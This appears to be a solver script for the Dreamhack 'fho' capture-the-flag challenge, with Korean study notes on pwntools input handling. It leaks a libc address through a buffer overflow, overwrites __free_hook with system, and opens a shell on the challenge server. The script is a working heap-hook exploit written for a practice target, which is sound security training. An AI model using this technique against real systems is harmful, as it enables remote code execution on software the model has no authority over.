from pwn import *

context.arch = "amd64"

p = remote("host3.dreamhack.games", 19416)
elf = ELF('./fho')
libc = ELF('./libc-2.27.so')

# [1] Leak libc base

# 1. buf의 위치 : rbp - 0x40
# 2. buf의 크기 : rbp - 0x30
# 3. canary의 위치 : rbp - 0x8
# 4. libc_start_main+x(return address)의 위치  : rbp + 0x8 (gdb를 통해 확인 가능)

# 따라서, rsp를 기준으로 0x48 = 0x30(buf 채워짐) + 0x8(쓰레기값?) + 0x8(canary 채워짐) + 0x8(rbp = sfp 채워짐) : 이렇게 되면 return_address를 가리킴
# canary의 변조는, main의 모든 수행을 마친 후 main이 완전히 끝나기 직전에 확인하는데, 여기서는 main이 끝나기 전에 이미 free를 호출하기 때문에 canary 변조 확인에 걸리지 않음
# 그래서, canary를 trash 값으로 채워도 상관없음

payload = b'a' * 0x48 
p.send(payload)
# sendline으로 보내면 '\n' = 0x0a 까지 보내져서, printf("%s") 로 payload 뒤를 못받기 때문에 이를 잘 생각해야함 
# 그리고 read는 scanf와 달리 sendline으로 개행문자를 기준으로 개행문자 전까지 받는게 아니라 입력된 send만큼만 받으니까 이 차이도 이해해야함

p.recvuntil(b'Buf: ' + payload)

# 1. 64비트 주소 체계에서 하위 48비트만 쓰고 상위 16비트는 안쓰기 때문에 항상 상위 16비트(16진수 4자리)는 '\x00\x00'임
# 2. p.recvn(8)로 받으면, 마지막에 출력될 \x00\x00 은 널문자인데, printf(%s)는 널문자를 만나기 전까지 출력하기 때문에, 
# 항상 (p.recvn(6) + b'\x00\x00') 또는 개행문자를 제거한 (p.recvline()[:-1] + b'\x00\x00')으로 해야함
# printf가 아닌 write여도 중간에 '\xaa\x00\xaa' 처럼 널문자를 만나면 출력 안하고 뛰어 넘어서 '\xaa\xaa'만 출력함
# 3. 리틀 엔디언에서는 %s로 문자열을 출력할 때, 낮은 주소 먼저 출력되기 때문에 순서를 잘 생각해줘야함 (따라서, \x00\x00이 제일 마지막에 출력될 차례임, 널이라 출력안되긴 하지만)
# 4. u64는 주소 계산을 위해 바이트 문자열을 정수로 변환하는데, 여기서도 string의 마지막이 높은 주소로 가기 때문에 잘 생각해줘서 b'\x00\x00'을 뒤에 붙여줘야함
libc_start_main_xx = u64(p.recvn(6) + b'\x00\x00') 

# 아래 방식은 마지막 '\n' 개행 문자 제거 후 붙임
# libc_start_main_xx = u64(p.recvline()[:-1] + b'\x00'*2) 

# libc_start_main+x 는 라이브러리 버전마다 다르기 때문에 libc.libc_start_main_return을 더해주면 일관성 있게 구할 수 있음
libc_base = libc_start_main_xx - libc.libc_start_main_return 

# [2] Overwrite `free_hook` with `system`

free_hook = libc_base + libc.symbols['__free_hook']
system = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search(b'/bin/sh')) # libc에서 문자열을 검색하는 방법

# [3] Exploit

# scanf는 개행문자까지 받고, 개행문자를 버리기 때문에 send로 하면 안되고, 항상 sendline을 써야함
# scanf로 int형인 %d나 %lld를 받을 때에는, 문자열 그 자체를 정수로 해석하기 때문에 str()이나 str().encode()로 전달해줘야함
# 반면에 scanf("%s"), read, gets와 같은 경우 입력 받은 값을 문자열으로 해석하여 메모리에 입력하기 때문에 p64()로 패킹해서 전달해줘야함
# 그리고 print(p64())로 출력해보면 b'\x00\x...' 이렇게 출력되는데, 이건 사람이 읽을 수 있도록 문자열 리터럴로 표현된 것이고,
# 실제로 p.send()를 통해 전달 될 때는 해당 데이터를 64비트 리틀 엔디언 바이너리(이진) 데이터로 보내기 때문에 수신측에서 메모리에 16진수로 그대로 들어가게함
# 만약 "12"를 scanf(%d)로 입력받으면 메모리에 "0xc"로 저장되겠지만, scanf("%s"), read, gets로 입력 받으면 메모리에 "0x3231"가 저장됨
# 따라서, 정수 "12(0xc)"를 scanf("%d")로 입력할 때는 str().encode()를 해줘야하고, scanf("%s")로 입력할 때는 p64()로 패킹해줘야함

# 1. 주소를 string으로 변환해서 전달함
p.sendline(str(free_hook))
p.sendline(str(system))
p.sendline(str(binsh))

# 2. 주소를 string으로 변환 후 byte string으로 다시 변환해서 전달함 (str(free_hook).encode는 encode 객체를 리턴하는거라서 아예 다른거니까 주의)
# byte string 쓰는 이유는, remote로 데이터를 보낼 때 기본적으로 시스템 콜은 바이트 데이터를 다루고, 
# string으로 표현할 수 없는 null 문자열의 경우, byte string으로 b'\x00' 으로 보내야 하기 때문이다.
# 이번 문제에서는 null 문자가 아닌 정수 그 자체를 보내는 것이기 때문에 필수적으로 encode()를 해주지 않아도 되지만, 항상 encode() 해주는 것이 좋다.
# p.sendline(str(free_hook).encode())
# p.sendline(str(system).encode())
# p.sendline(str(binsh).encode())

# 3. payload를 보낼때, 항상 send 관련 함수는 argument를 int가 아닌 string으로 받기 때문에 int 그 자체로는 절대 보낼 수 없음
# 따라서, 위의 두 예시처럼 string이나 byte string으로 변환해줘야함
# p.sendline(free_hook)
# p.sendline(system)
# p.sendline(binsh)

# 4. p64를 통해 정수를 8바이트 string으로 패킹하면, b'\x56\x34\x12\x00...' 와 같은 형식으로 보내지기 때문에 scanf(%d)로 '\x00'을 입력 받으면 값을 제대로 넣을 수 없음
# p64()는 read, gets, scanf("%s") 와 같이 문자열로 입력을 받을 때만 써야핢
# p.sendline(p64(free_hook))
# p.sendline(p64(system))
# p.sendline(p64(binsh))

# print를 해보면 차이를 잘 알 수 있음
print(p64(free_hook))
print(str(free_hook))
print(str(free_hook).encode())

p.interactive()